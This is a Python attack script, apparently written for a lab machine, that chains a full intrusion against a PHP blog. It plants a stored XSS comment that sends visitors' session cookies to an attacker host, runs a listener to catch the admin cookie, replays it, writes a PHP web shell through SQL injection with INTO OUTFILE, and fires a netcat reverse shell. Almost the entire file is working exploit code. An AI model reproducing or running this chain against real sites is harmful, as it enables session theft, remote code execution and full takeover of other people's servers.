# importing the requests library 
import requests 
import socket
import http.server
import socketserver
import threading
import time
from urllib.parse import urlparse
from urllib.parse import parse_qs

class MyHttpRequestHandler(http.server.SimpleHTTPRequestHandler):
    def do_GET(self):
        flag = 0
        # Sending an '200 OK' response
        self.send_response(200)

        # Setting the header
        self.send_header("Content-type", "text/html")

        # Whenever using 'send_header', you also have to call 'end_headers'
        self.end_headers()

        # Extract query param
        query_components = parse_qs(urlparse(self.path).query)
        if 'PHPSESSID' in query_components:
            if (flag == 0):
                print('found cookie, lets auth to admin page')
                flag = 1
                adminCookie = query_components['PHPSESSID']
                #adminCookie is a list that looks like this: ['qgagkuro6r4b27q1b9dqae1ua0']
                #therefore we need to parse and get the string only
                adminCookie = adminCookie[0]
                print("Admin cookie = ", adminCookie)
                print("\n")

                URL = "http://192.168.106.145/admin/index.php"
                PARAMS = {
                    'user':'test', 
                    'password' : 'noob'
                }

                cookies = {
                    "PHPSESSID" : adminCookie
                }

                r = requests.post(URL, cookies=cookies, data = PARAMS)
                print("Request sent to admin panel\n")

                authString = "Write a new post</a>"
                if authString in r.text:
                    print("auth success, send payload!\n")
                    auth = 1
                else:
                    print("auth failed\n")
                    auth = 0

                if (auth == 1):
                    URL = "http://192.168.106.145/admin/edit.php?id=0%20UNION%20SELECT%201,2,3,%20'%3C?php%20system($_GET%5B%5C'c%5C'%5D);%20?%3E'%20INTO%20OUTFILE%20'/var/www/css/shell.php'"
                    PARAMS = { 
                        'user':'test', 
                    'password' : 'noob',
                    }

                    r = requests.get(URL, cookies=cookies)
                    print(r.text)


                    print("RCE achieved, lets get shell!\n")
                    URL = "http://192.168.106.145/css/shell.php?c=nc -e /bin/sh 192.168.106.148 443"
                    r = requests.get(URL, cookies=cookies)
                    #reverse shell to port 443 nc -e /bin/sh 10.0.0.1 1234

                    #payload
                    #UNION SELECT 1,2, '<?php system($_GET[\'c\']); ?>', 4 INTO OUTFILE '/var/www/css/shell.php'



        # Some custom HTML code, possibly generated by another function
        html = f"<html><head></head><body><h1>Hello</h1></body></html>"

        # Writing the HTML contents with UTF-8
        self.wfile.write(bytes(html, "utf8"))

        return





# api-endpoint 
URL = "http://192.168.106.145/post_comment.php?id=2"

  
# defining a params dict for the parameters to be sent to the API 
#PARAMS = {'address':location} 
#<script>document.write('<img src="http://192.168.106.148/?'+document.cookie+'  "/>');</script>
#
#
PARAMS = {
    'title':'test', 
    'author' : 'noob',
    #lol triple quotes in text to escape nested quotes
    'text' : '''<script>document.write('<img src="http://192.168.106.148/?'+document.cookie+'  "/>');</script> ''',
    'submit' : 'Submit Query'
}

# sending get request and saving the response as response object 
r = requests.post(url = URL, data = PARAMS) 
  
# extracting data in json format 
#print (r.status_code)
#print (r.text)
if (r.status_code != 200):
    print("something broke")
 
else:
    print("comment has been sent!\n")

    #here on to start listener
    print("setting up server!\n")
    HOST = '127.0.0.1'
    PORT = 80

    handler = MyHttpRequestHandler

    with socketserver.TCPServer(("", PORT), handler) as httpd:
        print("Server started at localhost:" + str(PORT))
        httpd.serve_forever()
